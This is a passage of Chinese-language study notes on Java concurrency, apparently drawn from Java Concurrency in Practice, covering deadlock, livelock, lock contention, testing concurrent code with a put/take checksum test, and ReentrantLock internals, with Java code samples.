并且这是无界队列，线程池还是会保证至少有一个线程在跑</p></li><li><p>如果使用了无界队列，其实maxSize也没什么用，因为总是会添加队列成功——除非超过了<code>Integer.MAX_VALUE</code>。</p></li><li><p>队列的作用在于</p><ul><li>防止core线程不忙但是没能及时从队列中pop出task导致添加多余的线程</li><li>使得系统平缓应对小波峰——避免一有风吹草动系统就跟着波动（怎么感觉有点像惊群效应）。小波峰的含义是，对用户的响应的延迟在接受范围内</li><li>削峰填谷</li></ul></li></ul><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><h4 id="锁顺序死锁"><a href="#锁顺序死锁" class="headerlink" title="锁顺序死锁"></a>锁顺序死锁</h4><ul><li><p>在持有锁时调用某个外部方法，那么将可能出现死锁，或阻塞时间过长</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Warning: deadlock-prone!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taxi</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GuardedBy</span>(<span class="string">"this"</span>) <span class="keyword">private</span> Point location, destination;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Dispatcher dispatcher;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Taxi</span><span class="params">(Dispatcher dispatcher)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dispatcher = dispatcher;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Point <span class="title">getLocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> location;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">setLocation</span><span class="params">(Point location)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.location = location;</span><br><span class="line">        <span class="keyword">if</span> (location.equals(destination))</span><br><span class="line">            dispatcher.notifyAvailable(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dispatcher</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GuardedBy</span>(<span class="string">"this"</span>) <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;Taxi&gt; taxis;</span><br><span class="line">    <span class="meta">@GuardedBy</span>(<span class="string">"this"</span>) <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;Taxi&gt; availableTaxis;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Dispatcher</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        taxis = <span class="keyword">new</span> HashSet&lt;Taxi&gt;();</span><br><span class="line">        availableTaxis = <span class="keyword">new</span> HashSet&lt;Taxi&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">notifyAvailable</span><span class="params">(Taxi taxi)</span> </span>&#123;</span><br><span class="line">        availableTaxis.add(taxi);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Image <span class="title">getImage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Image image = <span class="keyword">new</span> Image();</span><br><span class="line">        <span class="keyword">for</span> (Taxi t : taxis)</span><br><span class="line">            image.drawMarker(t.getLocation());</span><br><span class="line">        <span class="keyword">return</span> image;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>某个线程调用<code>setLocation</code>，然后在持有该Taxis的锁时调用Dispatcher的<code>notifyAvaiable</code>。同时，另一个线程调用getImage，持有dispatcher的锁然后请求taxis的锁。从而死锁</p></li><li><p>开放调用：调用某个方法时不需要持有锁。即可能使用开放调用，可以更容易找到需要获得多个锁的代码路径。如果因为开放调用而导致某些操作不是原子的，那么可以通过一些协议来避免该路径被并发执行——比如搞一个标志，然后其他线程看到该标志为xx时就不执行</p><blockquote><p>The need to rely on open calls and careful lock ordering reflects the fundamental messiness of composing synchronized objects rather than synchronizing composed objects. </p></blockquote></li><li>避免锁顺序死锁<ul><li>以固定的顺序加锁</li><li>如果加锁顺序取决于调用的参数顺序呢（比如获得parm的<code>obj1</code>、<code>obj2</code>内部锁，那么就取决于<code>obj1</code>、<code>obj2</code>的顺序），那么利用<code>System.identityHashCode(obj)</code>来决定是那个obj先加锁，如果两个的hashCode相同，那么加一个“加时赛锁”（就是先加锁这个“加时赛锁”，然后再加锁两个对象），确保同一时间只有一个线程在对<code>obj1</code>、<code>obj2</code>加锁</li></ul></li></ul><h4 id="资源死锁"><a href="#资源死锁" class="headerlink" title="资源死锁"></a>资源死锁</h4><ul><li>比如某个线程持有某个链接池的链接等待另一个链接池的链接，另一个线程顺序颠倒地持有和请求</li><li>线程依赖死锁<ul><li>当线程池不够大，而线程池里的任务依赖于同一线程池的任务，那么会导致，某个任务正在跑，然后其依赖于处于队列中的任务，从而死锁</li><li>这种就要求线程池要经过一定的配置——比如不能太小等。所以要将配置策略文档化</li><li>只有当任务相互独立时，为线程池或工作队列设置界限才是合理的。任务之间存在依赖性，有界的线程池或队列就可能导致线程饥饿死锁</li><li>解决方法<ul><li>使用无界的线程池，比如<code>newCachedThreadPool</code></li><li>使用有界的线程池，并使用<code>SynchronousQueue</code>作为工作队列（这样当线程池满的时候调用者就会被阻塞从而知道子任务无法运行），以及<code>Caller-Runs</code>饱和策略</li><li>为什么不使用0长度的其他blockingQueue而使用SynchronousQueue（以下均为个人观点）<ul><li>一方面，其他blockingQueue不支持0长度。所以有可能有一个被等待的子任务就死锁了</li><li>另一方面，如果无法增加核心worker（新建线程），那么task都跑到队列中，这时候，如果没有线程在等待从队列中获得task，队列就会立刻返回（因为使用的是<code>offer</code>而不是会阻塞的<code>put</code>），从而在可能死锁时（就是子任务没线程能运行时），可以执行拒绝策略。</li></ul></li></ul></li></ul></li></ul><h4 id="消除锁的方法"><a href="#消除锁的方法" class="headerlink" title="消除锁的方法"></a>消除锁的方法</h4><ul><li>比如要求在遍历一个集合时，集合保持一致性，那么可以通过加锁复制该集合，然后遍历副本</li></ul><h4 id="避免死锁的其他方法"><a href="#避免死锁的其他方法" class="headerlink" title="避免死锁的其他方法"></a>避免死锁的其他方法</h4><ul><li>使用有定时功能的锁，并在失败时记录日志、适当rollback</li><li>threadDump可以提供<code>synchronized</code>、<code>ReentrantLock</code>等的死锁信息。通过定时触发threadDump可以有效的获知加锁信息</li></ul><h3 id="饥饿和优先级"><a href="#饥饿和优先级" class="headerlink" title="饥饿和优先级"></a>饥饿和优先级</h3><ul><li>在 Java 程序设计语言中，每一个线程有一个优先级。</li><li>默认情况下，一个线程继承它的父线程的优先级。</li><li>可以用<code>setPriority</code> 方法提高或降低任何一个线程的优先级</li><li>可以将优先级设置为在 MIN_PRIORITY (在 Thread 类中定义为 1 ) 与 MAX_PRIORITY (定义为 10 ) 之间的任何值。NORM_PRIORITY 被定义为 5</li><li>每当线程调度器有机会选择新线程时， 它首先选择具有较高优先级的线程。但是，线程优先级是高度依赖于系统的</li><li><p>如果有几个高优先级的线程没有进入非活动状态， 低优先级的线程<strong>可能</strong>永远也不能执行</p></li><li><p>尽量不要改变线程优先级，如果改变了，那么程序的行为就与平台相关了。并且可能导致饥饿</p></li><li>在大多数java应用程序中，所有线程都具有相同的<code>Thread.NORM_PRIORITY</code>，我测试了Daemon线程和非Daemon线程，都是<code>5</code>（linux 4.18.0-13）</li><li><code>Thread.yield</code>和<code>Thread.sleep(0)</code>的语义都是未定义的，JVM可以将他们实现为空操作，也可以把他们视为线程调度的参考。在unix系统中并不要求他们拥有<code>sleep（0）</code>的语义——将当前线程放在该优先级对应的运行队列末尾，并将执行全交给相同优先级的其他线程，尽管有些JVM是按照这种方法来实现yield的</li></ul><h3 id="活锁"><a href="#活锁" class="headerlink" title="活锁"></a>活锁</h3><ul><li>不会阻塞线程但是也无法继续执行，因为线程总是不断重复执行相同的操作，而且总是失败<ul><li>比如：某个消息被处理时一定会失败，然而开发者错误的将这种错误当做可以修复的错误，从而把该消息又加入了消息队列头部，从而消息处理器会反复调用，并返回相同的结果，从而程序无法继续执行下去</li></ul></li><li>Livelock can also occur when multiple cooperating threads change their state in response to the others in such a way that no thread can ever make progress<ul><li>This is similar to what happens when two overly polite people are walking in opposite directions in a hallway: each steps out of the other’s way, and now they are again in each other’s way.so they both step aside again, and again, and again</li><li>解决方法：重试时引入随机性，比如信道上冲突时，随机退避一段时间</li></ul></li></ul><h3 id="可伸缩性"><a href="#可伸缩性" class="headerlink" title="可伸缩性"></a>可伸缩性</h3><h4 id="加速比的计算"><a href="#加速比的计算" class="headerlink" title="加速比的计算"></a>加速比的计算</h4><ul><li>$\text{speedup}\leq \frac{1}{F+\frac{(1-F)}{N}}$</li><li>其中$F$是串行化的比例，$N$是CPU数目，比如$F=10%$，$N=10$，则在加速比为5.3</li></ul><h4 id="锁竞争"><a href="#锁竞争" class="headerlink" title="锁竞争"></a>锁竞争</h4><ul><li>随着线程数目的增加，性能下降，原因是上下文切换开销和调度开销（比如CFS，两个nice值相同的非实时进程，100ms可以各自分得50ms，如果是100个进程，则只有1ms）</li><li>如果某个线程需要获取多个锁，那么可能获取了一个锁后又需要block，从而导致无效的调度</li></ul><h4 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h4><ul><li><code>vmstat</code>可以看到上下文切换次数、内核执行的时间占比</li><li>如果内核占用率比较高（超过10%），那么说明调度发生得很频繁，可能是由于IO或锁竞争导致的阻塞引起的</li></ul><h4 id="非竞争同步和竞争同步"><a href="#非竞争同步和竞争同步" class="headerlink" title="非竞争同步和竞争同步"></a>非竞争同步和竞争同步</h4><ul><li>非竞争同步可以完全在JVM中处理，竞争同步可能需要操作系统的介入</li><li><blockquote><p>When locking is contended, the losing thread(s) must block. The JVM can implement blocking either via spin-waiting (repeatedly trying to acquire the lock until it succeeds) or by suspending the blocked thread through the operating system.</p></blockquote></li><li>volatile通常是非竞争同步</li><li>synchronized针对无竞争同步进行了优化</li><li>在java5时（作者编写JCIP时）一个Fast-Path的非竞争同步将消耗20~250个时钟周期</li><li>其对程序整体性能的影响很低</li></ul><h4 id="同步的开销"><a href="#同步的开销" class="headerlink" title="同步的开销"></a>同步的开销</h4><ul><li>会增加总线的通信量，从而对其他线程造成影响<blockquote><p>This aspect is sometimes used to argue against the use of nonblocking algorithms without some sort of backoff, because under heavy contention,nonblocking algorithms generate more synchronization traffic than lock-based ones. See Chapter 15.</p></blockquote></li></ul><h4 id="排队理论"><a href="#排队理论" class="headerlink" title="排队理论"></a>排队理论</h4><ul><li>Little定律：在一个稳定的系统中，顾客的平均数量等于他们的平均达到率乘以他们在系统中的平均停留时间</li><li>所以考察锁的性能时要考考察锁的请求频率乘以每次持有锁的时间</li></ul><h4 id="降低锁的竞争程度"><a href="#降低锁的竞争程度" class="headerlink" title="降低锁的竞争程度"></a>降低锁的竞争程度</h4><ul><li>减少持有锁的时间<ul><li>将线程安全性委托给线程安全对象而不是直接对该对象加锁也可以缩小需要同步的块大小。比如<code>synchronized(a HashMap)</code>就比<code>Hashtable</code>的同步块大，因为<code>hashtable</code>内部只有到必要时才加锁，而不是整个操作都加锁。</li></ul></li><li>降低锁的请求频率<ul><li>锁分解：一个锁保护一个变量，不要多个变量共用一个锁</li><li>锁分段：比如<code>ConcurrentHashMap</code>使用16个锁，保护1/16散列桶。劣势是有时候需要持有所有的锁来执行操作（比如resize）</li></ul></li><li>使用有允许更高的并发性的协调的机制代替独占锁<blockquote><p>Replace exclusive locks with coordination mechanisms that permit greater concurrency.</p></blockquote></li><li>合并过小的锁（锁粗化，因为加锁需要代价，尤其是基于OS资源的锁）</li><li>避免热点域，比如多线程下的Map如果每次写入操作都需要更新<code>size</code>这个变量，那么<code>size</code>就成了热点域。可以通过使用多个<code>size</code>变量记录局部size，还可以维护一个全局的<code>volatile size</code>，每次写入操作导致<code>size</code>被更新时，将这个全局size设置为<code>-1</code>，每次调用<code>size()</code>时，把结果缓存在全局<code>size</code></li></ul><h4 id="对象池"><a href="#对象池" class="headerlink" title="对象池"></a>对象池</h4><ul><li>缺点<ul><li>如果太大，则可用内存会变小</li><li>有可能有旧对象到新对象的引用，从而对GC不利</li><li>需要同步，这个代价可能比new新对象更大，即使是非竞争同步，开销也比new新对象大</li></ul></li></ul><h4 id="直接在业务线程写日志-vs-分离日志到后台线程"><a href="#直接在业务线程写日志-vs-分离日志到后台线程" class="headerlink" title="直接在业务线程写日志 vs 分离日志到后台线程"></a>直接在业务线程写日志 vs 分离日志到后台线程</h4><ul><li>前者的缺点<ul><li>IO会阻塞，阻塞需要上下文切换，而可能阻塞的时间其实小于上下文切换的时间</li><li>阻塞结束后换入前，可能需要等待其他线程，从而延迟服务时间</li><li>在输出流上发生竞争（因为有多个业务线程直接往流上写日志，并且像c的printf其实是有锁的）</li><li>锁竞争会导致上下文切换、调度开销，从而进一步增加服务时间和内核工作的时间（即减少了跑业务的时间）</li></ul></li><li>后者的优点<ul><li>写入日志其实是写内存——写到日志队列，这是很快的</li><li>因为会发生竞争的动作（写日志）很快，从而减少了锁竞争，也就减少了发生上下文切换的次数</li><li>在日志队列未满之前，几乎不阻塞，因此也几乎不需要被调度出去</li><li>把一条包含锁竞争、IO的复杂路径变成一条简单的路径</li><li>只有一个日志线程，所以在流上没有锁和锁竞争，也就没有加锁的用户态内核态切换代价和锁竞争导致的上下文切换</li><li>削峰填谷</li></ul></li></ul><h3 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h3><h4 id="指标"><a href="#指标" class="headerlink" title="指标"></a>指标</h4><ul><li>资源利用率</li><li>响应时间</li><li>服务时间</li></ul><h4 id="测量方法"><a href="#测量方法" class="headerlink" title="测量方法"></a>测量方法</h4><ul><li>测量等待外部服务的时间</li><li>测量IO时间</li><li>测量网络流量</li><li>使用ThreadDump获得锁竞争的信息，竞争激烈的锁，会频繁出现在ThreadDump中 </li></ul><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ul><li><p>有安全性测试和活跃性测试</p><ul><li>安全性测试：不发生任何错误的行为</li><li>活跃性测试：某个良好的行为终究发生</li></ul></li><li><p>测试时可以使用以下随机数发生器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">xorShift</span><span class="params">(<span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    y ^= (y &lt;&lt; <span class="number">6</span>);</span><br><span class="line">    y ^= (y &gt;&gt;&gt; <span class="number">21</span>);</span><br><span class="line">    y ^= (y &lt;&lt; <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以使用<code>/home/hzx/MyStudy/notes/java/JSR166TestCase.java</code>作为测试基类（来自于<a href="http://gee.cs.oswego.edu/cgi-bin/viewcvs.cgi/jsr166/src/test/tck/JSR166TestCase.java）" target="_blank" rel="noopener">http://gee.cs.oswego.edu/cgi-bin/viewcvs.cgi/jsr166/src/test/tck/JSR166TestCase.java）</a></p></li><li>使用那些容易检查、容易出错的属性来测试</li><li>测试代码应该避免引入过多的同步、避免限制并发性，理想的情况是，测试属性中不需要任何同步（比如，如果代码中内存可见性有一些问题，但是测试代码中有一个<code>printf</code>（C的<code>printf</code>似乎可以充当内存屏障，毕竟<code>printf</code>需要lock），那么就会掩盖内存可见性问题）</li><li><p><code>Random</code>是线程安全的</p><blockquote><p>Instances of java.util.Random are threadsafe.(ref from Random’s javadoc)<br> 应该使用纯函数来计算随机数</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 计算出本线程私有的seed，然后使用下面这个xorShift不断迭代计算下一个seed</span></span><br><span class="line"><span class="keyword">int</span> seed = (<span class="keyword">this</span>.hashCode() ^ (<span class="keyword">int</span>) System.nanoTime());</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">xorShift</span><span class="params">(<span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    y ^= (y &lt;&lt; <span class="number">6</span>);</span><br><span class="line">    y ^= (y &gt;&gt;&gt; <span class="number">21</span>);</span><br><span class="line">    y ^= (y &lt;&lt; <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote></li><li><p>如果创建线程开销比较大，而每个线程运行的时间比较短，那么就可能导致循环里创建的线程其实变成了串行执行。可以通过引入<code>CyclicBarrier</code>来解决</p></li><li>为了避免在判断测试何时结束时需要与其他线程协调，可以使用确定性的结束条件</li><li>测量噪声<ul><li>可能来源（以map为例）<ul><li>hashCode的交错</li><li>线程的调度</li><li>rehash</li><li>GC、malloc的开销</li><li>OS的辅助任务</li></ul></li><li>不应该尝试在测试时去掉噪声，因为实际使用过程中也是有各种噪声的</li></ul></li><li><p>提高错误发生的概率</p><ul><li>在多处理器系统上，开大于处理器数目的线程数目，可以使得线程的交错更加不可预测</li><li>在不同的处理器数量、操作系统、处理器架构的系统上测试</li><li>访问共享状态的操作中，使用<code>Thread.yield</code>将产生更多的上下文切换（与平台相关，JVM可能将其实现为空操作），短时间的sleep</li></ul></li><li><p>实例分析：测试阻塞队列 </p><ul><li>如果使用一个类库提供的阻塞队列作为对照，那么就会引入过多的同步</li><li>更好的方法是，使用一个对顺序敏感（只有一个生产者、消费者的情况下）（比如不支持交换率的运算）的校验和计算函数来计算所有入列元素和出列元素的校验和，并进行比较，这样还可以测试出取出的元素的顺序</li><li>因为在每个消费者那里，不可能说每取出一个元素就要对应的操作全局的checksum，而是说边取出边操作一个局部的checksum，等全部取出后才去用局部checksum操作全局checksum，这意味着，只有一个生产者、消费者是才可以使用顺序敏感的函数，否则不应该使用这种函数</li><li>代码 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PutTakeTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ExecutorService pool = Executors.newCachedThreadPool();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AtomicInteger putSum = <span class="keyword">new</span> AtomicInteger(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AtomicInteger takeSum = <span class="keyword">new</span> AtomicInteger(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> CyclicBarrier barrier;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MyBlockingQueue&lt;Integer&gt; bb;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> nTrials, nPairs;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PutTakeTest</span><span class="params">(<span class="keyword">int</span> capacity, <span class="keyword">int</span> nPairs, <span class="keyword">int</span> nTrials)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.bb = <span class="keyword">new</span> MyBlockingQueue&lt;&gt;(capacity);</span><br><span class="line">        <span class="keyword">this</span>.nTrials = nTrials;</span><br><span class="line">        <span class="keyword">this</span>.nPairs = nPairs;</span><br><span class="line">        <span class="keyword">this</span>.barrier = <span class="keyword">new</span> CyclicBarrier(nPairs * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nPairs; i++) &#123;</span><br><span class="line">                pool.execute(<span class="keyword">new</span> Producer());</span><br><span class="line">                pool.execute(<span class="keyword">new</span> Consumer());</span><br><span class="line">            &#125;</span><br><span class="line">            barrier.await();</span><br><span class="line">            barrier.await();</span><br><span class="line">            assertEquals(putSum.get(), takeSum.get());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            pool.shutdown();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Producer</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> seed = (<span class="keyword">this</span>.hashCode() ^ (<span class="keyword">int</span>) System.nanoTime());</span><br><span class="line">                <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">                barrier.await();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = nTrials; i &gt; <span class="number">0</span>; --i) &#123;</span><br><span class="line">                    bb.put(seed);</span><br><span class="line">                    sum += seed;</span><br><span class="line">                    seed = xorShift(seed);</span><br><span class="line">                &#125;</span><br><span class="line">                putSum.getAndAdd(sum);</span><br><span class="line">                barrier.await();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Consumer</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                barrier.await();</span><br><span class="line">                <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = nTrials; i &gt; <span class="number">0</span>; --i) &#123;</span><br><span class="line">                    sum += bb.get();</span><br><span class="line">                &#125;</span><br><span class="line">                takeSum.getAndAdd(sum);</span><br><span class="line">                barrier.await();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">xorShift</span><span class="params">(<span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        y ^= (y &lt;&lt; <span class="number">6</span>);</span><br><span class="line">        y ^= (y &gt;&gt;&gt; <span class="number">21</span>);</span><br><span class="line">        y ^= (y &lt;&lt; <span class="number">7</span>);</span><br><span class="line">        <span class="keyword">return</span> y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="Lock类"><a href="#Lock类" class="headerlink" title="Lock类"></a>Lock类</h3><ul><li>Lock实现中必须提供与内部锁相同的内存可见性语义<blockquote><p>All Lock implementations must enforce the same memory synchronization semantics as provided by the built-in monitor lock, as described in The Java Language Specification (<a href="https://docs.oracle.com/javase/specs/jls/se12/html/jls-17.html#jls-17.4" target="_blank" rel="noopener">17.4 Memory Model</a>) :</p><ul><li>A successful lock operation has the same memory synchronization effects as a successful Lock action.</li><li>A successful unlock operation has the same memory synchronization effects as a successful Unlock action.<br>(ref from Lock’s javadoc)</li></ul></blockquote></li><li>加锁语义、调度算法、顺序保证、性能特性方面可以与内置所有所不同</li></ul><h4 id="ReentrantLock"><a href="#ReentrantLock" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h4><ul><li>获取ReentrantLock时，有着与进入同步代码块相同的内存语义</li><li>释放时，有着与退出同步代码块相同的内存语义</li><li><p>非公平的版本，在某个线程请求时，如果该锁变为可用，那么其可以直接获得锁，无需考虑正在排队的线程。其并不提倡插队，但是无法避免插队</p><ul><li><p>非公平版本的代码</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">NonfairSync</span> <span class="keyword">extends</span> <span class="title">Sync</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7316153563782823691L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Performs lock.  Try immediate barge, backing up to normal</span></span><br><span class="line"><span class="comment">     * acquire on failure.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">            setExclusiveOwnerThread(Thread.currentThread());</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            acquire(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> nonfairTryAcquire(acquires);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span 